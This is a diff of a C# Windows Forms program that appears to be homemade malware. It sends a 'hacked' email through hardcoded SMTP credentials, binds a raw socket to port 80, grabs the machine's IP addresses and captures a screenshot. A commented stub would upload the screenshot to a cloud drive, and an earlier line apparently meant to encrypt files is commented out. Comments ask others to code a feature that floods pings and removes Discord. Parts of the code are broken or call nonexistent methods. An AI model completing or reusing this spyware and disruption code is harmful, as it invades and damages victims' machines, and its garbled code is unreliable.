@@ -169,18 +169,17 @@ namespace WindowsFormsApp1
             SmtpServer.Credentials = new System.Net.NetworkCredential("ThisGuyGotHAXED!", "dont be stupid!");
             SmtpServer.EnableSsl = true;
             SmtpServer.SendMailAsync("Hello there this is a hacked email!", "whyareyousosus@gmail.com", "Hacked email sent", "hi");
-
+            // Actually sending the fridgin mail.
             SmtpServer.Send(mail);
-            Console.WriteLine("Send mail!");
             // Blocking a port.
             int portToBlock = 80;
             Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);
             IPEndPoint ep = new IPEndPoint(IPAddress.Loopback, portToBlock);
             s.Bind(ep);
-            // Whatever this function does or somethin
-            string password = "Hu11an_!ndusTr!al";
+            // Whatever this function does or somethin (PS: I added this to encrypt files but i didnt know how to fix some of it so i removed the broken code)
+            /*string password = "Hu11an_!ndusTr!al";
             GCHandle gch = GCHandle.Alloc(password, GCHandleType.Pinned);
-            gch.Free();
+            gch.Free(); */
             // IP Grabbing
             var host = Dns.GetHostEntry(Dns.GetHostName());
             foreach (var ip in host.AddressList)
@@ -197,7 +196,8 @@ namespace WindowsFormsApp1
             Graphics captureGraphics = Graphics.FromImage(captureBitmap);
             captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
             captureBitmap.Save(@"Capture.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
-            // This line of code removes the discord app for a bit. (PLEASE CODE THIS FOR ME)
+            // captureBitmap.UploadToWebsite("https://drive.google.com/drive/my-drive");
+            // This line of code creates a bunch of ping and removes discord. PLEASE CODE THIS FOR ME PEOPLE!
         }
     }
 }
